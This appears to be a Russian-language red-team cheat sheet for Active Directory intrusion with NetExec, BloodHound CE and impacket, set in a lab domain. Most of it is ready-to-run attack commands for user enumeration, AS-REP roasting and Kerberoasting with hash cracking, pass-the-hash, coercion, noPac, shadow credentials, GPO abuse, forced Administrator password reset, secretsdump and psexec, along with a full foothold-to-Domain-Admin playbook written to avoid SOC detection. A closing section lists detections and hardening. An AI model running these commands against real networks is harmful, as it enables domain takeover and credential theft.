## TL;DR

**Тройка инструментов для AD-разведки 2026:**

| Инструмент | Что делает | Когда использовать |
|---|---|---|
| **BloodHound** (Community Edition / Classic) | Визуализация графа AD (users, groups, computers, ACL, sessions, delegation) | После сбора данных — найти shortest path к DA, видеть цепочки ACL abuse |
| **SharpHound** / **RustHound** | Ingestor (collectors) для BloodHound | На скомпрометированной workstation / member server — собрать JSON для импорта в BloodHound |
| **nxc** (NetExec, бывший CrackMapExec) | Swiss army knife для SMB/LDAP/WinRM/RDP/MSSQL/SSH/FTP — enum, auth, exec, modules | С самого начала: user/group enum, AS-REP roast, Kerberoast, sessions, local-admin, ACL, coerce |

**Сценарий:** попали в сеть с AD (фишинг → user session на workstation, VPN, начальная точка). Цель — собрать BloodHound-данные **бесшумно** (только чтение через LDAP/SMB), найти **shortest path к Domain Admin**, не сломав прод и не триггернув SOC.

**Главное правило:** каждый шаг документируется в отчёте (команда + вывод + интерпретация), каждая команда **idempotentнасколько возможно** (повторный запуск = тот же результат). BloodHound — **для визуализации и приоритизации**, не для атаки; сама атака идёт по edge'ам графа.

## § 2. nxc (NetExec) — рабочая лошадка

### 2.1 Базовый enum через SMB

```bash
# Проверить, поддерживает ли хост SMB-аутентификацию
nxc smb 192.168.56.0/24
# OK           — NTLM auth включён
# Pwn3d!       — мы admin (плохо для цели, отлично для отчёта)
# STATUS_ACCESS_DENIED — auth требуется (норма для прод)

# Null session (если включено — старый AD, плохо настроенный)
nxc smb 192.168.56.10 -u '' -p ''
nxc smb 192.168.56.10 -u 'guest' -p ''

# С логином (для authenticated enum)
nxc smb 192.168.56.10 -u 'lowpriv' -p 'Welcome1!' -d lab.local
nxc smb 192.168.56.0/24 -u 'lowpriv' -p 'Welcome1!' -d lab.local  # подсеть
```

### 2.2 RID bruteforce — список пользователей без LDAP

```bash
# Найти валидных пользователей через RID-cycling (SMB Null session или с логином)
nxc smb 192.168.56.10 -u 'lowpriv' -p 'Welcome1!' -d lab.local --rid-brute
# или с большим MAXRID:
nxc smb 192.168.56.10 -u 'lowpriv' -p 'Welcome1!' --rid-brute 100000
```

**Результат:**

```text
SMB         192.168.56.10   445    DC01    [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:lab.local)
SMB         192.168.56.10   445    DC01    [+] lab.local\lowpriv:Welcome1! 
SMB         192.168.56.10   445    DC01    [+] Found 28 local users: Administrator, Guest, krbtgt, lowpriv, sqlservice, backup, john.doe, jane.smith, ...
```

### 2.3 LDAP enum — пользователи, группы, компьютеры

```bash
# Все пользователи
nxc ldap 192.168.56.10 -u 'lowpriv' -p 'Welcome1!' -d lab.local --users

# Все группы (только Domain Admins / admin-count=1)
nxc ldap 192.168.56.10 -u 'lowpriv' -p 'Welcome1!' -d lab.local --groups
nxc ldap 192.168.56.10 -u 'lowpriv' -p 'Welcome1!' -d lab.local --admin-count

# Все компьютеры
nxc ldap 192.168.56.10 -u 'lowpriv' -p 'Welcome1!' -d lab.local --computers

# Domain trusts (важно для cross-domain pivots)
nxc ldap 192.168.56.10 -u 'lowpriv' -p 'Welcome1!' -d lab.local --enum_trusts
```

### 2.4 AS-REP Roasting (без preauth → offline crack)

```bash
# Найти пользователей с отключённым Kerberos preauth (UF_DONT_REQUIRE_PREAUTH=0x400000)
nxc ldap 192.168.56.10 -u 'lowpriv' -p 'Welcome1!' -d lab.local --asreproast /tmp/asrep.txt
# Формат: $krb5asrep$23$user@lab.local:...
```

**Crack через hashcat:**

```bash
hashcat -m 18200 /tmp/asrep.txt /usr/share/wordlists/rockyou.txt
# или john:
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/asrep.txt
```

### 2.5 Kerberoasting (SPN → TGS ticket → offline crack)

```bash
# Найти SPN-enabled аккаунты (service accounts), выгрузить TGS
nxc ldap 192.168.56.10 -u 'lowpriv' -p 'Welcome1!' -d lab.local --kerberoasting /tmp/spn.txt
# Формат: $krb5tgs$23$*sqlservice@lab.local$...
```

**Crack:**

```bash
hashcat -m 13100 /tmp/spn.txt /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/spn.txt
```

### 2.6 Sessions / Local Admin (для BloodHound)

```bash
# Кто залогинен на каких машинах (через NetSessionEnum / NetWkstaUserEnum)
nxc smb 192.168.56.11 -u 'lowpriv' -p 'Welcome1!' -d lab.local --smb-sessions
nxc smb 192.168.56.11 -u 'lowpriv' -p 'Welcome1!' -d lab.local --loggedon-users

# Local admins (кто админ на конкретной машине)
nxc smb 192.168.56.11 -u 'lowpriv' -p 'Welcome1!' -d lab.local --local-groups
```

### 2.7 ACL / DACL (для BloodHound ACL edges)

```bash
# Через модуль daclread (сторонний модуль nxc)
nxc ldap 192.168.56.10 -u 'lowpriv' -p 'Welcome1!' -d lab.local -M daclread -o TARGET=Administrator

# Найти делегирования (unconstrained / constrained / RBCD)
nxc ldap 192.168.56.10 -u 'lowpriv' -p 'Welcome1!' -d lab.local --find-delegation
nxc ldap 192.168.56.10 -u 'lowpriv' -p 'Welcome1!' -d lab.local --trusted-for-delegation
```

### 2.8 WinRM / SMB lateral (после получения creds)

```bash
# Проверить WinRM-доступ (используем полученный пароль/hash)
nxc winrm 192.168.56.11 -u 'john.doe' -p 'Welcome1!' -d lab.local

# Выполнить команду (только если pwn3d)
nxc winrm 192.168.56.11 -u 'john.doe' -p 'Welcome1!' -d lab.local -x 'whoami /priv'

# Pass-the-Hash (без пароля, только NTLM)
nxc smb 192.168.56.11 -u 'john.doe' -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'

# Pass-the-Ticket (KRB5CCNAME=/tmp/john.ccache)
KRB5CCNAME=/tmp/john.ccache nxc smb 192.168.56.11 -k
```

### 2.9 Полезные модули nxc (для продвинутого)

```bash
# coerce_plus — PetitPotam / PrinterBug / DFSCoerce (для NTLM relay)
nxc smb 192.168.56.10 -u 'lowpriv' -p 'Welcome1!' -d lab.local -M coerce_plus -o LISTENER=192.168.56.100

# add-computer — добавить машинный аккаунт (для RBCD)
nxc smb 192.168.56.10 -u 'lowpriv' -p 'Welcome1!' -d lab.local -M add-computer -o COMPUTERNAME=HACKER$ COMPUTERPASS=Passw0rd!

# nopac — CVE-2021-42287 / CVE-2021-42278 (если патчи нет)
nxc smb 192.168.56.10 -u 'lowpriv' -p 'Welcome1!' -d lab.local -M nopac

# PetitPotam отдельно
nxc smb 192.168.56.10 -u 'lowpriv' -p 'Welcome1!' -d lab.local -M petitpotam -o LISTENER=192.168.56.100
```

## § 3. BloodHound Community Edition + bloodhound-ce-python

### 3.1 Сбор данных (ingestion)

```bash
# Базовый сбор (все коллекции: Group, LocalAdmin, Session, ACL, Trust, LoggedOn, ...)
bloodhound-ce-python -u 'lowpriv' -p 'Welcome1!' -d lab.local -ns 192.168.56.10 -c All
# -c All = Group, LocalAdmin, Session, ACL, Trust, LoggedOn, ObSc, Container, Computer, Properties, SMBShare, NPS, DCOM, GroupMembership, UserRights

# Только ключевые коллекции (быстрее, меньше шума)
bloodhound-ce-python -u 'lowpriv' -p 'Welcome1!' -d lab.local -ns 192.168.56.10 \
  -c Session,LocalAdmin,ACL,Group,Trust

# Использовать Kerberos вместо NTLM (тише для SOC)
bloodhound-ce-python -k -d lab.local -ns 192.168.56.10 -c All

bloodhound-ce-python -u 'lowpriv' -p 'Welcome1!' -d lab.local -ns 192.168.56.10 --secure -c All
```

### 3.3 Предустановленные Cypher-запросы (Custom Queries)

**В BloodHound CE → "CQL" (Custom Query Language) — кнопка "Custom Queries" внизу:**

| Запрос | Что ищет | Cypher |
|---|---|---|
| **Shortest path to DA** | Любой путь от текущего узла к Domain Admin | `MATCH p=shortestPath((u)-[*1..]->(g:Group {name:"DOMAIN ADMINS@LAB.LOCAL"})) WHERE u<>g RETURN p` |
| **Find all Domain Admins** | Все аккаунты в группе Domain Admins | `MATCH (u:User)-[:MemberOf*1..]->(g:Group) WHERE g.objectid ENDS WITH "-512" RETURN u` |
| **Users with GenericAll on Computer** | Кто может стать local admin через GenericAll | `MATCH (u:User)-[:GenericAll]->(c:Computer) RETURN u, c` |
| **Computers with unconstrained delegation** | Misconfig — printer-bug → DC compromise | `MATCH (c:Computer {unconstraineddelegation:true}) RETURN c` |
| **AS-REP Roastable users** | UF_DONT_REQUIRE_PREAUTH (нет preauth) | `MATCH (u:User {dontreqpreauth:true}) RETURN u` |
| **Kerberoastable users** | SPN + enabled account | `MATCH (u:User {hasspn:true, enabled:true}) RETURN u` |
| **Find all paths to krbtgt** | Shortest path к krbtgt (Golden Ticket source) | `MATCH p=shortestPath((u)-[*1..]->(k:User {name:"krbtgt@LAB.LOCAL"})) WHERE u<>k RETURN p` |
| **Find users with DCSync rights** | Кто может делать DCSync (DRSUAPI) | `MATCH (n)-[:MemberOf\|GetChanges\|GetChangesAll\|GetChangesInFilteredSet*1..]->(d:Domain) RETURN n` |
| **Find GPO abuse paths** | GPO modifications | `MATCH p=(u:User)-[:WriteDACL\|GenericAll\|WriteOwner*1..]->(g:GPO) RETURN p` |
| **Find shadow credential targets** | msDS-KeyCredentialLink write | `MATCH (u:User)-[:AddKeyCredentialLink]->(t:User) WHERE u<>t RETURN u,t` |

### 3.4 Что ищем в графе (сценарий → DA)

**Сценарий 1: пользователь john.doe в группе "Backup Operators"**

```
1. Открыть BloodHound → Search → john.doe
2. Click "Outbound Object Control" (исходящие права)
3. Видим: john.doe → MemberOf → "Backup Operators@LAB.LOCAL"
4. Click "Backup Operators" → "Outbound Object Control"
5. Видим: Backup Operators → GenericAll → DC01 (или компьютер в Domain Controllers OU)
6. Path: john.doe → Backup Operators → DC01 (GenericAll → ForceChangePassword на DA)

Атака:
nxc smb dc01.lab.local -u 'john.doe' -p 'Welcome1!' -d lab.local
# pwn3d → Backup Operators может читать SAM/SECURITY/SYSTEM
# или
certipy shadow -u 'john.doe@lab.local' -p 'Welcome1!' -dc-ip 192.168.56.10 -target dc01
# msDS-KeyCredentialLink → ESC14 → PKINIT auth → ticket → DA
```

**Сценарий 2: GenericAll на GPO**

```
1. Search → john.doe → Outbound → GenericAll на "Default Domain Policy"
2. GPO применяется к DC01 → push scheduled task / script
3. PyGPOAbuse (Python) → модифицировать GPO → добавить scheduled task
4. Дождаться применения (gpupdate / 90 мин)
5. → RCE на DC01 как SYSTEM
```

**Сценарий 3: ACL → ForceChangePassword**

```
1. Search → john.doe → HasSession на SRV01
2. SRV01 → GenericAll → Administrator
3. Attack: net rpc password Administrator 'NewP@ssw0rd!' -U 'lab.local/john.doe%Welcome1!' -S SRV01
4. → новый пароль для Administrator → log in via WinRM
```

## § 7. Комбинированный playbook (nxc → BloodHound → exploit)

### 7.1 Полный сценарий от нулевого знания до DA

```bash
# === Шаг 1: начальная разведка (nxc) ===
nxc smb 192.168.56.0/24                    # найти хосты
nxc smb 192.168.56.10 -u 'lowpriv' -p 'Welcome1!' --rid-brute  # пользователи
nxc ldap 192.168.56.10 -u 'lowpriv' -p 'Welcome1!' --asreproast /tmp/asrep.txt
nxc ldap 192.168.56.10 -u 'lowpriv' -p 'Welcome1!' --kerberoasting /tmp/spn.txt

# === Шаг 2: BloodHound ingestion ===
bloodhound-ce-python -u 'lowpriv' -p 'Welcome1!' -d lab.local -ns 192.168.56.10 -c All
# → /tmp/bh-output/...zip

# === Шаг 3: анализ графа в BloodHound CE UI ===
# - Login http://localhost:8080
# - Import zip
# - Search john.doe → Outbound Object Control → путь к DA
# - Выбрать shortest path → изучить каждый edge

# === Шаг 4: эксплуатация (по типу edge'а) ===
# Если GenericAll на компьютер:
certipy shadow -u 'john.doe@lab.local' -p 'Welcome1!' -dc-ip 192.168.56.10 -target dc01
# или
impacket-secretsdump 'lab.local/john.doe:Welcome1!'@dc01.lab.local

# Если GenericAll на GPO:
python3 pygpoabuse.py 'lab.local/john.doe:Welcome1!' -gpo-id <GPO_GUID> -taskname "Updater" -command "powershell -enc ..."

# Если ACL на OU с DC:
net rpc password Administrator 'NewP@ssw0rd!' -U 'lab.local/john.doe%Welcome1!' -S dc01.lab.local

# === Шаг 5: lateral movement (impacket) ===
impacket-psexec 'lab.local/Administrator:NewP@ssw0rd!@dc01.lab.local'
```

## § 8. Детект (Blue Team) и защита

### 8.1 SOC-детекты (что должно триггерить алерт)

| Поведение | Event ID | Источник | Sigma rule |
|---|---|---|---|
| Bulk LDAP query с BloodHound-style фильтрами | 1644 (ELK), 4624 (Win Sec) | Domain Controller | Sigma `rule::Suspicious LDAP Queries for BloodHound` |
| Replication request с не-DC аккаунта | 4624 + 4662 (DS-Replication-Get-Changes) | Domain Controller | Sigma `rule::DCSync Attempt from Non-DC` |
| AS-REP Roasting (LDAP filter `userAccountControl:1.2.840.113556.1.4.803:=4194304`) | 1644 / ELK | Domain Controller | Sigma `rule::Possible AS-REP Roasting` |
| Kerberoasting (4769 с RC4-HMAC `0x17`) | 4769 (Ticket Options) | Domain Controller | Sigma `rule::Kerberoasting via RC4-HMAC` |
| SharpHound/RustHound on disk | AV/EDR | Workstation | Yara `yara::SharpHound_Artifacts` |
| Bulk SMB sessions enum | 4624 + 5145 (Network Share Access) | Workstations | Sigma `rule::BloodHound Session Enumeration` |

### 8.2 Защита (для Blue Team)

1. **Tiering Model** — разделять Domain Controllers / User Tier / Application Tier. Учётки одного tier не должны иметь прав на объекты другого tier (GenericAll, WriteDACL).
2. **PAW (Privileged Access Workstations)** — admin-операции только с выделенных машин. BloodHound на PAW — нет.
3. **Tier 0 / Tier 1 / Tier 2 separation** — стандарт Microsoft ([Securing Privileged Access](https://learn.microsoft.com/en-us/security/privileged-access-workstations/overview)).
4. **GPO audit** — кто менял GPO за последние N дней.
5. **ACL audit** — `nxc ldap --daclread` / `BloodHound ACL analytics` периодически от Blue Team.
6. **Honeypot user** — создать `j.admin.test` с флагом "DONT_REQUIRE_PREAUTH=1" → если кто-то его AS-REP-roast → алерт.
7. **Disable unnecessary AS-REP** — пройти по всем пользователям, убрать UF_DONT_REQUIRE_PREAUTH, если не нужен.
8. **gMSA (Group Managed Service Accounts)** — убрать обычные SPN-enabled аккаунты (где возможно).
9. **LDAP signing + channel binding** — запретить unsigned LDAP (помогает против NTLM relay на LDAP).
10. **SMB signing required** — на всех member servers + workstations.
